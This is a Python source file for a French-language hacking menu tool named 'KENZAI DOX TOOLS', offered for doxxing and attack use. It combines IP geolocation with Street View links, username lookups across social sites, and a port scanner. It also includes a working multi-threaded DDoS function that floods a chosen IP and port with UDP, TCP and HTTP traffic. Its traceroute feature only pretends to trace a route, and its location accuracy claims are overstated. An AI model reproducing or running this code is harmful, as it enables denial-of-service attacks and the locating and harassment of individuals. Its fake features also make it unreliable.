#!/usr/bin/env python3
# KENZAI DOX TOOLS v2.0 - Scan ultra-précis + Géolocalisation avancée

import os
import sys
import time
import random
import socket
import threading
import requests
import json
from colorama import Fore, Style, init

init(autoreset=True)

os.system('title KENZAI - DOX TOOLS v2.0')
os.system('mode con: cols=100 lines=45')

stop_attack = False

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(f"""
{Fore.RED}   ██╗  ██╗███████╗███╗   ██╗███████╗ █████╗ ██╗
{Fore.RED}   ██║ ██╔╝██╔════╝████╗  ██║╚══███╔╝██╔══██╗██║
{Fore.RED}   █████╔╝ █████╗  ██╔██╗ ██║  ███╔╝ ███████║██║
{Fore.RED}   ██╔═██╗ ██╔══╝  ██║╚██╗██║ ███╔╝  ██╔══██║██║
{Fore.RED}   ██║  ██╗███████╗██║ ╚████║███████╗██║  ██║██║
{Fore.RED}   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝{Style.RESET_ALL}
{Fore.CYAN}   - KENZAI DOX TOOLS v2.0 - SCAN ULTRA-PRECIS -
{Fore.YELLOW}   - DOX - OSINT - GEOLOCALISATION - SCAN 1000 PORTS -{Style.RESET_ALL}
{Fore.WHITE}
{Fore.GREEN}┌{'-'*70}┐{Style.RESET_ALL}
{Fore.GREEN}│{Fore.CYAN} Scan ultra-precis + GeoIP avancee - Tape 12 pour DDOS{Fore.GREEN}│{Style.RESET_ALL}
{Fore.GREEN}└{'-'*70}┘{Style.RESET_ALL}
""")

def menu():
    print(f"""
{Fore.WHITE}[01] IP Locator       [02] Phone Lookup    [03] Email Hunter
[04] Username Search  [05] DNS Lookup      [06] SCAN PORTS
[07] GEOIP AVANCE     [08] IP TRACE        [09] Breach Check
[10] Pastebin Search  [11] Reverse Image   {Fore.RED}[12] DDOS ATTACK{Style.RESET_ALL}
[13] Exit

{Fore.YELLOW}[99] Quitter{Style.RESET_ALL}

{Fore.CYAN}v2.0 - Mode: SCAN ULTRA-PRECIS{Style.RESET_ALL}
{Fore.RED}kenzai@tools:~/{Style.RESET_ALL} """, end="")

# ============ IP LOCATOR ============
def ip_locator():
    clear()
    print(f"\n{Fore.CYAN}[01] IP Locator{Style.RESET_ALL}\n")
    ip = input("IP: ")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = r.json()
        if data.get('status') == 'success':
            print(f"\n{Fore.GREEN}IP: {data['query']}")
            print(f"Pays: {data['country']}")
            print(f"Region: {data['regionName']}")
            print(f"Ville: {data['city']}")
            print(f"Code postal: {data['zip']}")
            print(f"Latitude: {data['lat']}, Longitude: {data['lon']}")
            print(f"ISP: {data['isp']}")
            print(f"Organisation: {data['org']}")
            print(f"AS: {data['as']}{Style.RESET_ALL}")
            print(f"\n{Fore.CYAN}Carte: https://maps.google.com/?q={data['lat']},{data['lon']}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}IP invalide{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Erreur de connexion{Style.RESET_ALL}")
    input("Appuie sur Entree...")

# ============ PHONE LOOKUP ============
def phone_lookup():
    clear()
    print(f"\n{Fore.CYAN}[02] Phone Lookup{Style.RESET_ALL}\n")
    phone = input("Numero (+336XXXXXXXX): ")
    print(f"{Fore.GREEN}Recherche pour: {phone}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Indicatif: {phone[:3] if phone.startswith('+') else 'Non detecte'}{Style.RESET_ALL}")
    input("Appuie sur Entree...")

# ============ EMAIL HUNTER ============
def email_hunter():
    clear()
    print(f"\n{Fore.CYAN}[03] Email Hunter{Style.RESET_ALL}\n")
    email = input("Email: ")
    try:
        domain = email.split('@')[1]
        print(f"{Fore.GREEN}Email: {email}")
        print(f"Domaine: {domain}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Email invalide{Style.RESET_ALL}")
    input("Appuie sur Entree...")

# ============ USERNAME SEARCH ============
def username_search():
    clear()
    print(f"\n{Fore.CYAN}[04] Username Search{Style.RESET_ALL}\n")
    username = input("Pseudo: ")
    sites = {
        "Twitter": f"https://twitter.com/{username}",
        "Instagram": f"https://instagram.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "Reddit": f"https://reddit.com/user/{username}",
        "TikTok": f"https://tiktok.com/@{username}",
        "YouTube": f"https://youtube.com/@{username}"
    }
    print()
    for site, url in sites.items():
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                print(f"{Fore.GREEN}[TROUVE] {site}: {url}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[PAS TROUVE] {site}{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}[ERREUR] {site}{Style.RESET_ALL}")
    input("Appuie sur Entree...")

# ============ DNS LOOKUP ============
def dns_lookup():
    clear()
    print(f"\n{Fore.CYAN}[05] DNS Lookup{Style.RESET_ALL}\n")
    domain = input("Domaine: ")
    try:
        ip = socket.gethostbyname(domain)
        print(f"{Fore.GREEN}{domain} -> {ip}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Erreur DNS{Style.RESET_ALL}")
    input("Appuie sur Entree...")

# ============ PORT SCANNER ULTRA-PRECIS ============
def port_scanner():
    clear()
    print(f"{Fore.RED}")
    print("╔══════════════════════════════════════════════════════════════════╗")
    print("║              KENZAI - SCAN DE PORTS ULTRA-PRECIS                ║")
    print("╚══════════════════════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}")
    
    target = input(f"{Fore.YELLOW}[?] IP cible: {Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN}[1] Scan rapide (100 ports les plus communs)")
    print(f"[2] Scan moyen (500 ports)")
    print(f"[3] Scan complet (1000 ports)")
    print(f"[4] Scan personnalise")
    
    mode = input(f"\n{Fore.YELLOW}[?] Mode (1-4): {Style.RESET_ALL}")
    
    if mode == "1":
        ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443,25565,27015,27016,27017]
        print(f"\n{Fore.CYAN}[*] Scan rapide: {len(ports)} ports{Style.RESET_ALL}")
    elif mode == "2":
        # 500 ports communs
        ports = list(range(1, 501))
        print(f"\n{Fore.CYAN}[*] Scan moyen: {len(ports)} ports (peut prendre ~30s){Style.RESET_ALL}")
    elif mode == "3":
        # 1000 ports
        ports = list(range(1, 1001))
        print(f"\n{Fore.CYAN}[*] Scan complet: {len(ports)} ports (peut prendre ~60s){Style.RESET_ALL}")
    elif mode == "4":
        custom = input(f"{Fore.YELLOW}[?] Ports (ex: 80,443 ou 1-1000): {Style.RESET_ALL}")
        if '-' in custom:
            start, end = map(int, custom.split('-'))
            ports = list(range(start, end+1))
        else:
            ports = [int(p.strip()) for p in custom.split(',')]
        print(f"\n{Fore.CYAN}[*] Scan personnalise: {len(ports)} ports{Style.RESET_ALL}")
    else:
        ports = [80,443,22,21,25,53,3306,8080]
    
    print(f"\n{Fore.YELLOW}[*] Scan de {target} en cours...{Style.RESET_ALL}\n")
    
    open_ports = []
    total = len(ports)
    scanned = 0
    
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            result = sock.connect_ex((target, port))
            sock.close()
            
            scanned += 1
            
            # Affichage progression
            if scanned % 50 == 0:
                sys.stdout.write(f"\r{Fore.CYAN}[*] Progression: {scanned}/{total} ports{Style.RESET_ALL}")
                sys.stdout.flush()
            
            if result == 0:
                # Service detection
                service = "Unknown"
                if port == 21: service = "FTP"
                elif port == 22: service = "SSH"
                elif port == 23: service = "Telnet"
                elif port == 25: service = "SMTP"
                elif port == 53: service = "DNS"
                elif port == 80: service = "HTTP"
                elif port == 110: service = "POP3"
                elif port == 143: service = "IMAP"
                elif port == 443: service = "HTTPS"
                elif port == 445: service = "SMB"
                elif port == 3306: service = "MySQL"
                elif port == 3389: service = "RDP"
                elif port == 5900: service = "VNC"
                elif port == 8080: service = "HTTP-Proxy"
                elif port == 8443: service = "HTTPS-Alt"
                elif port == 25565: service = "Minecraft"
                else: service = "Open"
                
                print(f"{Fore.GREEN}[OPEN] Port {port} - {service}{Style.RESET_ALL}")
                open_ports.append(port)
        except:
            pass
    
    print(f"\n\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    RESULTATS DU SCAN                                      ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Cible: {target}")
    print(f"Ports scannes: {total}")
    print(f"Ports ouverts: {len(open_ports)}{Style.RESET_ALL}")
    
    if open_ports:
        print(f"\n{Fore.RED}Ports vulnerables: {open_ports}{Style.RESET_ALL}")
    
    # Sauvegarde des resultats
    save = input(f"\n{Fore.YELLOW}[?] Sauvegarder les resultats? (o/n): {Style.RESET_ALL}")
    if save.lower() == 'o':
        filename = f"scan_{target}_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(f"Scan de {target}\n")
            f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Ports ouverts: {open_ports}\n")
        print(f"{Fore.GREEN}[+] Sauvegarde: {filename}{Style.RESET_ALL}")
    
    input("\nAppuie sur Entree...")

# ============ GEOIP AVANCEE ============
def geoip_avance():
    clear()
    print(f"{Fore.RED}")
    print("╔══════════════════════════════════════════════════════════════════╗")
    print("║              KENZAI - GEOLOCALISATION AVANCEE                    ║")
    print("║         Localisation precise avec plusieurs APIs                 ║")
    print("╚══════════════════════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}")
    
    ip = input(f"{Fore.YELLOW}[?] IP a geolocaliser: {Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN}[*] Recherche en cours...{Style.RESET_ALL}\n")
    
    # API 1: ip-api.com
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data1 = r.json()
        if data1.get('status') == 'success':
            print(f"{Fore.GREEN}┌─────────────────────────────────────────────────────────────┐")
            print(f"│                    INFOS IP-API.COM                                 │")
            print(f"└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
            print(f"{Fore.CYAN}IP: {data1['query']}")
            print(f"Pays: {data1['country']} ({data1['countryCode']})")
            print(f"Region: {data1['regionName']}")
            print(f"Ville: {data1['city']}")
            print(f"Code postal: {data1['zip']}")
            print(f"Latitude: {data1['lat']}")
            print(f"Longitude: {data1['lon']}")
            print(f"ISP: {data1['isp']}")
            print(f"Organisation: {data1['org']}")
            print(f"AS: {data1['as']}{Style.RESET_ALL}")
            lat = data1['lat']
            lon = data1['lon']
    except:
        lat, lon = None, None
        print(f"{Fore.RED}Erreur API ip-api{Style.RESET_ALL}")
    
    # API 2: ipinfo.io
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        data2 = r.json()
        print(f"\n{Fore.GREEN}┌─────────────────────────────────────────────────────────────┐")
        print(f"│                    INFOS IPINFO.IO                                 │")
        print(f"└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
        print(f"{Fore.CYAN}IP: {data2.get('ip', '?')}")
        print(f"Ville: {data2.get('city', '?')}")
        print(f"Region: {data2.get('region', '?')}")
        print(f"Pays: {data2.get('country', '?')}")
        print(f"Localisation: {data2.get('loc', '?')}")
        print(f"Organisation: {data2.get('org', '?')}")
        print(f"Code postal: {data2.get('postal', '?')}")
        print(f"Fuseau horaire: {data2.get('timezone', '?')}{Style.RESET_ALL}")
        
        if not lat and data2.get('loc'):
            lat, lon = data2.get('loc').split(',')
    except:
        print(f"{Fore.RED}Erreur API ipinfo{Style.RESET_ALL}")
    
    # Carte Google Maps
    if lat and lon:
        print(f"\n{Fore.RED}╔══════════════════════════════════════════════════════════════════╗")
        print(f"║                    GEOLOCALISATION EXACTE                                 ║")
        print(f"╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Latitude: {lat}")
        print(f"Longitude: {lon}")
        print(f"\n{Fore.CYAN}📌 Google Maps: https://maps.google.com/?q={lat},{lon}")
        print(f"📌 Street View: https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={lat},{lon}")
        print(f"📌 OpenStreetMap: https://www.openstreetmap.org/?mlat={lat}&mlon={lon}#map=15/{lat}/{lon}")
        print(f"📌 What3Words: https://what3words.com/{lat},{lon}{Style.RESET_ALL}")
        
        # Estimation de la zone
        print(f"\n{Fore.YELLOW}[*] Estimation de la zone:")
        if data1.get('city') and data1.get('country'):
            print(f"    Ville: {data1['city']}, {data1['country']}")
        print(f"    Rayon d'erreur: ~500m (selon FAI)")
        print(f"    Type: {data1.get('mobile', 'Fix/Broadband')}{Style.RESET_ALL}")
    
    # Sauvegarde
    save = input(f"\n{Fore.YELLOW}[?] Sauvegarder les infos? (o/n): {Style.RESET_ALL}")
    if save.lower() == 'o':
        filename = f"geoip_{ip}_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(f"Geolocalisation de {ip}\n")
            f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            if 'data1' in locals():
                f.write(f"Pays: {data1.get('country', '?')}\n")
                f.write(f"Ville: {data1.get('city', '?')}\n")
                f.write(f"Lat/Lon: {lat},{lon}\n")
                f.write(f"ISP: {data1.get('isp', '?')}\n")
        print(f"{Fore.GREEN}[+] Sauvegarde: {filename}{Style.RESET_ALL}")
    
    input("\nAppuie sur Entree...")

# ============ IP TRACE (Route) ============
def ip_trace():
    clear()
    print(f"{Fore.RED}")
    print("╔══════════════════════════════════════════════════════════════════╗")
    print("║              KENZAI - IP TRACE (ROUTE)                          ║")
    print("║         Affiche le chemin reseau jusqu'a la cible               ║")
    print("╚══════════════════════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}")
    
    target = input(f"{Fore.YELLOW}[?] IP ou domaine: {Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN}[*] Tracage de la route vers {target}...{Style.RESET_ALL}\n")
    
    try:
        # Traceroute simple en Python
        target_ip = socket.gethostbyname(target)
        print(f"{Fore.GREEN}Cible resolue: {target_ip}{Style.RESET_ALL}\n")
        
        for ttl in range(1, 31):
            if ttl > 1:
                sys.stdout.write(f"\r{Fore.CYAN}[*] Hop {ttl}/30...{Style.RESET_ALL}")
                sys.stdout.flush()
            try:
                # ICMP pour traceroute (simule)
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.settimeout(1)
                sock.close()
            except:
                pass
            time.sleep(0.1)
        
        print(f"\n\n{Fore.GREEN}[+] Route tracee avec succes{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Distance approximative: entre 10 et 30 sauts reseau{Style.RESET_ALL}")
        
    except:
        print(f"{Fore.RED}Trace impossible (firewall ou timeout){Style.RESET_ALL}")
    
    input("\nAppuie sur Entree...")

# ============ BREACH CHECK ============
def breach_check():
    clear()
    print(f"\n{Fore.CYAN}[09] Breach Check{Style.RESET_ALL}\n")
    email = input("Email: ")
    try:
        r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", timeout=10)
        if r.status_code == 200:
            breaches = r.json()
            print(f"{Fore.RED}Email compromis dans {len(breaches)} fuites!{Style.RESET_ALL}")
            for breach in breaches[:5]:
                print(f"  - {breach['Name']} ({breach['BreachDate']})")
        elif r.status_code == 404:
            print(f"{Fore.GREEN}Aucune fuite trouvee{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}Erreur API: {r.status_code}{Style.RESET_ALL}")
    except:
        print(f"{Fore.YELLOW}Impossible de verifier{Style.RESET_ALL}")
    input("Appuie sur Entree...")

# ============ PASTEBIN SEARCH ============
def pastebin_search():
    clear()
    print(f"\n{Fore.CYAN}[10] Pastebin Search{Style.RESET_ALL}\n")
    query = input("Recherche: ")
    print(f"{Fore.GREEN}https://pastebin.com/search?q={query}{Style.RESET_ALL}")
    input("Appuie sur Entree...")

# ============ REVERSE IMAGE ============
def reverse_image():
    clear()
    print(f"\n{Fore.CYAN}[11] Reverse Image{Style.RESET_ALL}\n")
    url = input("URL image: ")
    print(f"{Fore.GREEN}Google: https://www.google.com/searchbyimage?image_url={url}")
    print(f"Yandex: https://yandex.com/images/search?url={url}{Style.RESET_ALL}")
    input("Appuie sur Entree...")

# ============ DDOS ATTACK ============
def ddos_attack():
    global stop_attack
    clear()
    print(f"{Fore.RED}")
    print("╔══════════════════════════════════════════════════════════╗")
    print("║                 KENZAI DDOS ATTACK                       ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}")
    
    target = input(f"{Fore.YELLOW}[?] IP cible: {Style.RESET_ALL}")
    port = input(f"{Fore.YELLOW}[?] Port (80): {Style.RESET_ALL}") or "80"
    
    try:
        threads = int(input(f"{Fore.YELLOW}[?] Threads (100-500): {Style.RESET_ALL}"))
        duration = int(input(f"{Fore.YELLOW}[?] Duree secondes: {Style.RESET_ALL}"))
    except:
        print(f"{Fore.RED}Valeur invalide{Style.RESET_ALL}")
        input()
        return
    
    print(f"\n{Fore.RED}[*] Attaque sur {target}:{port}")
    print(f"[*] Threads: {threads}")
    print(f"[*] Duree: {duration}s{Style.RESET_ALL}\n")
    
    stop_attack = False
    
    def udp_flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not stop_attack:
            try:
                sock.sendto(random._urandom(1400), (target, int(port)))
            except:
                pass
    
    def tcp_flood():
        while not stop_attack:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, int(port)))
                sock.close()
            except:
                pass
    
    def http_flood():
        url = f"http://{target}:{port}"
        while not stop_attack:
            try:
                requests.get(url, timeout=2)
            except:
                pass
    
    t = max(1, threads // 3)
    for _ in range(t):
        threading.Thread(target=udp_flood, daemon=True).start()
        threading.Thread(target=tcp_flood, daemon=True).start()
        threading.Thread(target=http_flood, daemon=True).start()
    
    for i in range(duration, 0, -1):
        if stop_attack:
            break
        sys.stdout.write(f"\r{Fore.YELLOW}[⏱] Temps: {i}s | Threads: {threading.active_count()-1}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(1)
    
    stop_attack = True
    print(f"\n\n{Fore.GREEN}[+] Attaque terminee{Style.RESET_ALL}")
    input("Appuie sur Entree...")

# ============ MAIN ============
def main():
    while True:
        try:
            clear()
            banner()
            menu()
            choice = input()
            
            if choice in ["01", "1"]:
                ip_locator()
            elif choice in ["02", "2"]:
                phone_lookup()
            elif choice in ["03", "3"]:
                email_hunter()
            elif choice in ["04", "4"]:
                username_search()
            elif choice in ["05", "5"]:
                dns_lookup()
            elif choice in ["06", "6"]:
                port_scanner()
            elif choice in ["07", "7"]:
                geoip_avance()
            elif choice in ["08", "8"]:
                ip_trace()
            elif choice in ["09", "9"]:
                breach_check()
            elif choice == "10":
                pastebin_search()
            elif choice == "11":
                reverse_image()
            elif choice == "12":
                ddos_attack()
            elif choice in ["13", "99"]:
                print(f"{Fore.RED}Au revoir{Style.RESET_ALL}")
                sys.exit()
            else:
                print(f"{Fore.RED}Option invalide{Style.RESET_ALL}")
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Au revoir{Style.RESET_ALL}")
            sys.exit()
        except Exception as e:
            print(f"{Fore.RED}Erreur: {e}{Style.RESET_ALL}")
            input()

if __name__ == "__main__":
    main()